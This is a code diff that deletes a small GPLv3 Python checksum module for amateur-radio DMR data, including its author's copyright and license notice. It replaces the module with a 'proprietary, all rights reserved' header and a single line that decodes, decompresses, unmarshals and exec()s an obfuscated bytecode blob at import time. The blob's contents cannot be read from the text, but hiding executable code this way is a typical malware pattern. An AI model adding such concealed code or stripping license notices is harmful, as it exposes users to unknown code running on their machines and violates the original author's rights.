@@ -1,52 +1,5 @@
-#!/usr/bin/env python
-#
-###############################################################################
-#   Copyright (C) 2016-2018  Cortney T. Buffington, N0MJS <n0mjs@me.com>
-#
-#   This program is free software; you can redistribute it and/or modify
-#   it under the terms of the GNU General Public License as published by
-#   the Free Software Foundation; either version 3 of the License, or
-#   (at your option) any later version.
-#
-#   This program is distributed in the hope that it will be useful,
-#   but WITHOUT ANY WARRANTY; without even the implied warranty of
-#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#   GNU General Public License for more details.
-#
-#   You should have received a copy of the GNU General Public License
-#   along with this program; if not, write to the Free Software Foundation,
-#   Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
-###############################################################################
-
-
-from bitarray import bitarray
-
-# Does anybody read this stuff? There's a PEP somewhere that says I should do this.
-__author__     = 'Cortney T. Buffington, N0MJS'
-__copyright__  = 'Copyright (c) 2016-2018 Cortney T. Buffington, N0MJS and the K0USY Group'
-__credits__    = 'Jonathan Naylor, G4KLX'
-__license__    = 'GNU GPLv3'
-__maintainer__ = 'Cort Buffington, N0MJS'
-__email__      = 'n0mjs@me.com'
-
-
-def csum5(_data):
-    accum = 0
-    assert len(_data) == 9, 'csum5 expected 9 bytes of data and got something else'
-    
-    for i in range(9):
-        accum += _data[i]
-    accum = bytes([accum % 31])
-    csum = bitarray()
-    csum.frombytes(accum)
-    del csum[0:3]
-
-    return csum
-
-
-if __name__ == '__main__':
-    
-    message = b'\x00\x10\x20\x00\x0c\x30\x2f\x9b\xe5'
-    
-    result = csum5(message)
-    print(result, type(result))
+# -*- coding: utf-8 -*-
+# NinjaRadio Proprietary Architecture - All Rights Reserved
+# Unauthorized copying, reverse engineering or distribution is strictly prohibited.
+import zlib, marshal, base64
+exec(marshal.loads(zlib.decompress(base64.b85decode('c-nnb--{bX9G}@A$!@ZVmlKOArx~G$fwZR8_~WRp*w)Bh4N5$?uC&WGGnb@hchlKPF(C&_skkQrQz%&Q#is+ge<mmQ5Ecpt(uaEs)Tcf<lX%xeN@sSyJKvf4e7@iL%+CG|=1T0p_p=Aw{01<<umv1o0tm2VLM)pSR!kYIrh;RpisNPsYY%`KCmPm&kOY*T!3k5B0ErWQ7Xq*ckIBshA59Wr4U$-#+vV6j>Dc4ZlGSO;8%JUw4<qe%li8Ho-QLO-k205Z(Rb(27oDxGrdwy8TR@fK*K5_@S694tmp1DShTf~?(S_pqkIr)Q33?R@*)B$`LC|_}qk03Csn==uPOW*a%^J3gDt5Q!(E=)exPE=Jr<W@msQk_Kdmr>p3DTD&VYo%-j{mts&ec4p2Imx3c$0;~|I8GI+mOx8_ranrSemKoC)NO#cX@B`WbJ*(<QGUREh4Xio2hN75Bs1mWlvW1QUGkjL7J&^F(FoZ{N(F!k%4Cxf3a#Y_O{%Y|4_h7O8<W>5cFjXvHFwr8Sn8Eja8`F(vdFGDb@UrQ$pm&HmNa!(WmHkmk}R%TL|0Co}NqHW61X$!Wvv;L|Q&M$_WCo`Mes*E#gKhwcR?2)G3;ZnMmKFo-_6HN~BtXE>i7Ut>Z+n87U&LFLr=<d2U>Eo9-Q(+PLXmiqvUVG{a}#5#o#65P-3f3a&j#ro+z8>R|P8=9kMMucMXf&gB8`JWVYR&+lvwHYWh8r>7=_V=Xm&V|e$`oBLWeR73TNkr|dAUwF7WEbJS(10yFGUl)AA)v==eT)AHvmiCqGfs!35*|BDX--dU?YN#J3Uklcs2|**xvK+hVT9z*)1WO1Q#rJ=ITFIwo8&6o4-C+%nT2_>@tlIH?;BJz;l;9@wXHKhGBd$-llb(?>-iQF|mPPnL%d)02h@h_Rh?Q}N_`c1>j#1)wS}aoAlmjD$b=%}mK$pc&V2PXO+C|61off%7(ey*$O8&~tM1~Mf3IM)60&mSflNeYo28nUz`ye&W<b&imvm#7BNRKnQK%c~taA^Wg%nDG9u=kgo9m(0lbSWqwrk2Bv;m13-2DgGQ$BG_Y3*Q}{;q~6b!lS~zk~>gxqvL0i1j=cSoF@D)J77o*'))))
